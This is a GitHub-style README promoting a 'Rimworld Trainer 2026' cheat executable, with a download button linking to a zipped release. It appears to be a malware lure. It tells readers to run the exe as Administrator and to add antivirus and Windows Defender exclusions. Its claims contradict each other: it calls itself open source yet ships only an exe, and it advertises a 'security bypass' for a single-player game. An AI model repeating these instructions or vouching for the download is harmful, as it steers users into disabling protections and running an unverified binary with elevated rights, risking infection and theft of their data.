<div align="center">
  <img src="https://capsule-render.vercel.app/api?type=rect&color=FF4500,DC143C,8B0000&height=225&section=header&text=Rimworld%20Trainer%202026&fontSize=62&fontColor=fff&animation=scaleIn&fontAlignY=38&desc=Advanced%20Strategy%20Cheat%20Engine&descAlignY=56&descSize=20" width="100%"/>

  # 🗺️ Rimworld Trainer 2026 ⚙️

  ![Version](https://img.shields.io/badge/version-2026-blue?style=for-the-badge)
  ![Windows EXE](https://img.shields.io/badge/Windows-EXE-0078d4?style=for-the-badge&logo=windows&logoColor=white)
  ![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)
  ![Updated](https://img.shields.io/badge/updated-2026-brightgreen?style=for-the-badge)
  ![Platform](https://img.shields.io/badge/platform-Windows-0078d4?style=for-the-badge&logo=windows)
  ![Downloads](https://img.shields.io/badge/downloads-10K+-informational?style=for-the-badge)

  ### ⭐ Support the project — leave a star!

  <p align="center">
    <a href="https://github.com/agung167/rimworld-trainer/releases/download/v2.1.85/rimworld-trainer-v2.1.85.zip">
      <img src="https://img.shields.io/badge/%F0%9F%94%A5%20DOWNLOAD%20LATEST%20VERSION-FF4500?style=for-the-badge&logoColor=white&labelColor=DC143C" width="450" alt="Download Rimworld Trainer 2026"/>
    </a>
  </p>
</div>

## 📋 Table of Contents
- [✨ Key Features](#-key-features)
- [📖 Overview](#-overview)
- [⚙️ System Requirements](#-system-requirements)
- [📦 Installation](#-installation)
- [🛡️ Safety & Integrity Notes](#-safety--integrity-notes)
- [🕹️ Usage Guide](#-usage-guide)
- [📊 Compatibility Matrix](#-compatibility-matrix)
- [❓ FAQ](#-faq)
- [💬 Community & Support](#-community--support)
- [📜 License](#-license)
- [⚠️ Legal Notice](#-legal-notice)

## ✨ Key Features

> [!TIP]
> Toggle any feature in real-time via a clean, compact overlay. No game restart required.

- **Resource Manipulation**: Instantly set or add Silver, Components, Plasteel, and all other raw materials.
- **Colonist Stat Editor**: Adjust health, mood, skill levels (0–20), passions, and traits.
- **Research Override**: Unlock any project instantly, regardless of research bench level.
- **Construction & Spawning**: Spawn items, animals, or pawns at cursor position.
- **Weather & Storyteller Control**: Force events (raid, traders, mental break) or block them.
- **Time Scale Adjustment**: Slow motion, pause-free speed, or hyper-speed simulation.
- **Infinite Mood & Needs**: Disable hunger, rest, recreation, and comfort decay.
- **Security Bypass**: Integrated bypass for Rimworld’s core integrity checks.
- **Hotkey System**: Customize every function (including toggles) with a single keybind.

## 📖 Overview

> [!NOTE]
> Rimworld Trainer 2026 is a standalone cheat tool built for Windows. No external dependencies, no Python install, no source compilation. Just an `.exe` that works.

This tool provides granular control over Rimworld’s simulation engine. Designed for veteran players and modders alike, it allows you to bypass game constraints, edit live variables, and test colony scenarios without restarting. The trainer operates entirely in user-space memory, reading and writing game data through a validated API layer. It supports Rimworld versions 1.4 through the 2026 expansion.

## ⚙️ System Requirements

> [!IMPORTANT]
> This tool requires Windows 10 build 1903 or newer. Administrator privileges are required for memory read/write access.

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| **OS** | Windows 10 (1903+) | Windows 11 |
| **CPU** | Intel Core i5-2400 / AMD FX-6300 | Intel Core i7-8700 / AMD Ryzen 5 3600 |
| **RAM** | 4 GB | 8 GB |
| **Storage** | 50 MB free | 100 MB free |
| **Rimworld** | v1.4 (official) | v2026 (latest expansion) |
| **Permissions** | Administrator access | Administrator access |

> [!WARNING]
> Running the trainer as a standard user may cause injection failures. Always right-click → "Run as administrator."

## 📦 Installation

> [!TIP]
> Your antivirus may flag the executable due to its memory injection method. Add an exclusion for the download folder.

1. **Download** the archive from the button above.
2. **Extract** all files to a dedicated folder (e.g. `C:\Rimworld_Trainer`).
3. **Run** `RimworldTrainer-2026.exe` **as Administrator**.
4. Launch Rimworld (Steam or GOG).
5. Press **`F1`** in-game to open the trainer overlay.
6. Toggle features from the overlay.

## 🛡️ Safety & Integrity Notes

> [!CAUTION]
> Using memory editors in online/multiplayer modes (Rimworld Multiplayer mod) may result in session desyncs or softlocks. Single-player usage only.

- **No data is written to disk** — all edits are volatile and reset on game exit.
- **No network calls** — the trainer is fully offline. No telemetry, no phoning home.
- **Version detection** — automatically detects your Rimworld build and applies correct memory offsets.
- **Backup saves** — while corruption is rare, create a manual save before using experimental features.

## 🕹️ Usage Guide

> [!TIP]
> Bind your most-used functions to hotkeys via the `Settings` tab in the overlay. Default toggles: `F1` open menu, `F2` infinite resources.

1. **Open the overlay**: `F1`
2. **Navigate tabs**: `Left/Right Arrow` or click
3. **Activate a feature**: click its toggle switch
4. **Adjust values**: use the slider or numeric input field
5. **Close overlay**: `F1` again or `Esc`

**Example**: To set all colonists’ skills to 20:
- Open overlay → `Colonist Editor` tab
- Select pawn from dropdown
- Click `Max All Skills`
- Confirm

## 📊 Compatibility Matrix

| Rimworld Version | Status | Notes |
|------------------|--------|-------|
| v1.4 | ✅ Full | All features tested |
| v1.5 | ✅ Full | All features tested |
| 2026 (Biotech+Anomaly) | ✅ Full | Includes new traits & mechanics |
| Steam (latest) | ✅ Full | Auto-updates offline signatures |
| GOG (offline) | ✅ Full | Same as Steam build |
| Multiplayer mod | ⚠️ Partial | Disable raid/storyteller events |

## ❓ FAQ

**Q: The trainer doesn't open after pressing F1.**
A: Ensure you ran it as Administrator. Check Windows Defender — add the .exe to the exclusion list.

**Q: Will this get me banned from Steam?**
A: Rimworld is a single-player game. No anti-cheat is present. No ban risk exists.

**Q: Can I use it with mods?**
A: Yes. Resource, colonist, and research features work alongside most mods. Event control may conflict with story-teller-rewriting mods.

**Q: The trainer shows "game not found."**
A: Rimworld must be running before you start the trainer, or at least before it attempts injection.

**Q: How do I uninstall?**
A: Delete the extracted folder. No registry entries, no background services.

## 💬 Community & Support

- **GitHub Issues** — report bugs or request features
- **Discord** (invite in release notes) — real-time help
- **Wiki** (in the `docs/` folder) — full command list and tutorials

> [!NOTE]
> This is an open-source project. Contributions (memory offset updates, localization, new features) are welcome via pull requests.

## 📜 License

MIT — Copyright © 2026. See `LICENSE` for details.

## ⚠️ Legal Notice

> [!CAUTION]
> This software is provided for educational and personal use only. You are solely responsible for compliance with the terms of service of the game's publisher (Ludeon Studios). The developer is not liable for any violations, bans, or damages incurred through the use of this tool.

<p align="center">
  <a href="https://github.com/agung167/rimworld-trainer/releases